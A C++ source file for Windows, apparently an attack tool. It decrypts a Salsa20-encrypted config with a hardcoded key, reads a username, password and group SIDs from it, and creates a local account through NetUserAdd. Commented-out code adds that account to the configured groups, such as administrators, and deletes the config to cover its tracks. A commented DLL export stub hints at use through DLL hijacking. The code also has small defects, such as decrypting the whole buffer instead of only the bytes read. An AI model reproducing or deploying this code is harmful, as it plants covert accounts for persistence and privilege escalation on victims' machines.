#include <windows.h>
#include <lm.h>
#include <sddl.h>
#include <string.h>
#include <tchar.h>

#include <Lmaccess.h>
#include <lmerr.h>

#include "salsa20.h"

//#include <iostream>

#pragma comment(lib, "netapi32.lib")


//extern "C" __declspec(dllexport) NET_API_STATUS NET_API_FUNCTION NetUserAdd(LPCWSTR servername, DWORD level, LPBYTE buf, LPDWORD parm_err);

#define BUF_SIZE 256
#define CONFIG_MAX_SIZE 4096

static constexpr uint8_t KEY[16] = {217, 78, 5, 76, 59, 107, 8, 44, 116, 168, 84, 50, 232, 185, 198, 130};
static constexpr uint8_t NONCE[8] = {195, 197, 12, 237, 251, 20, 130, 183};

typedef struct _config {
    LPWSTR username;
    LPWSTR password;
    LPWSTR groupSids[4];
} config;


bool addUser(LPWSTR name, LPWSTR pw) {
    USER_INFO_1 userInfo;
    userInfo.usri1_name = name;
    userInfo.usri1_password = pw;
    userInfo.usri1_priv = USER_PRIV_USER;
    userInfo.usri1_home_dir = NULL;
    userInfo.usri1_comment = NULL;
    userInfo.usri1_flags = UF_SCRIPT;
    userInfo.usri1_script_path = NULL;

    return NetUserAdd(NULL, 1, (LPBYTE) & userInfo, NULL) == NERR_Success;
    return 0;
}

bool addUserToGroup(LPWSTR userName, LPWSTR groupSIDStr) {
    PSID groupSID;
    if (!ConvertStringSidToSid(groupSIDStr, &groupSID)) {
        return false;
    }

    SID_NAME_USE sidType;
    DWORD cchName = BUF_SIZE;
    WCHAR groupName[BUF_SIZE];
    DWORD cchReferencedDomainName = BUF_SIZE;
    WCHAR referencedDomainName[BUF_SIZE];

    if (LookupAccountSid(NULL, groupSID, groupName, &cchName, referencedDomainName, &cchReferencedDomainName, &sidType) == FALSE) {
       return false;
    }

    LOCALGROUP_MEMBERS_INFO_3 gmInfo;
    gmInfo.lgrmi3_domainandname = userName;
    return NetLocalGroupAddMembers(NULL, groupName, 3, (LPBYTE)&gmInfo, 1) == NERR_Success;
}

LPWSTR toWstr(const char* str) {
    int size = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
    LPWSTR wideStr = (LPWSTR)malloc(size * sizeof(WCHAR));
    MultiByteToWideChar(CP_UTF8, 0, str, -1, wideStr, size);
    return wideStr;
}

bool readConfig(LPCWSTR path, uint8_t* outBuf, size_t outBufSize, size_t *bytesRead) {
    HANDLE fileHandle;
    DWORD fileSize;

    fileHandle = CreateFile(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fileHandle == INVALID_HANDLE_VALUE) {
        return false;
    }

    fileSize = GetFileSize(fileHandle, NULL);
    if (fileSize > outBufSize) {
        return false;
    }

    DWORD read;
    if (!ReadFile(fileHandle, outBuf, fileSize, &read, NULL)) {
        CloseHandle(fileHandle);
        return false;
    }
    CloseHandle(fileHandle);

    s20_crypt((uint8_t*)KEY, (uint8_t*)NONCE, 0, (uint8_t*)outBuf, outBufSize);
    outBuf[read - 1] = 0;

    *bytesRead = read;   
    return true;
}

bool parseConfig(const uint8_t* configBuf, size_t configLen, config *outConfig) {
    constexpr char userNameMarker[] = "username=";
    constexpr char passwordMarker[] = "password=";
    constexpr char groupSidMarker[] = "groupsid=";

    char lineDelim = '\n';
    char *lineStart = (char*)configBuf;
    uint8_t numGroupsSids = 0;

    while (lineStart < (char*)(configBuf + configLen)) {
        char* lineEnd = strchr(lineStart, lineDelim);
        if (lineEnd) {
            *lineEnd = 0;
        } else {
            lineEnd = (char*)(configBuf + configLen);
        }

        size_t maxLeft = ((char*)(configBuf + configLen)) - lineStart;
        size_t cmpLenUsername = min(sizeof(userNameMarker) - 1, maxLeft);
        size_t cmpLenPassword = min(sizeof(passwordMarker) - 1, maxLeft);
        size_t cmpLenGropSids = min(sizeof(groupSidMarker) - 1, maxLeft);
        if (strncmp(userNameMarker, lineStart, cmpLenUsername) == 0) {
            outConfig->username = toWstr(lineStart + min(sizeof(userNameMarker) - 1, maxLeft));
        } else if (strncmp(passwordMarker, lineStart, cmpLenPassword) == 0) {
            outConfig->password = toWstr(lineStart + min(sizeof(passwordMarker) - 1, maxLeft));
        } else if (strncmp(groupSidMarker, lineStart, cmpLenGropSids) == 0) {
            if (numGroupsSids < 4) {
                outConfig->groupSids[numGroupsSids++] = toWstr(lineStart + min(sizeof(groupSidMarker) - 1, maxLeft));
            }
        }

        lineStart = lineEnd + 1;
    }

    return true;
}

int addmin() {
    WCHAR executablePath[MAX_PATH];
    GetModuleFileName(NULL, executablePath, MAX_PATH);

    size_t len = _tcslen(executablePath);
    executablePath[len - 3] = 't';
    executablePath[len - 2] = 'x';
    executablePath[len - 1] = 't';

    LPCWSTR configPath = executablePath;

    // //std::wcout << "config path:" << std::endl;
    // //std::wcout << configPath << std::endl;

    uint8_t buf[CONFIG_MAX_SIZE];
    size_t read = 0;
    readConfig(configPath, buf, CONFIG_MAX_SIZE - 1, &read);
    buf[read] = 0;

    char* textBuf = (char*)buf;

    config conf;
    memset(conf.groupSids, 0, sizeof(conf.groupSids));
    parseConfig(buf, read, &conf);

    bool success = addUser(conf.username, conf.password);
    //if (success) {
    //    for (size_t i = 0; i < 4; ++i) {
    //        if (conf.groupSids[i]) {
    //            addUserToGroup(conf.username, conf.groupSids[i]);
    //        }
    //    }
    //    DeleteFile(configPath);
    //}

    //free(conf.username);
    //free(conf.password);
    //free(conf.groupSids[0]);
    //free(conf.groupSids[1]);
    //free(conf.groupSids[2]);
    //free(conf.groupSids[3]);

    return 0;
}

//int main(void) {
//    addmin();
//    return 0;
//}

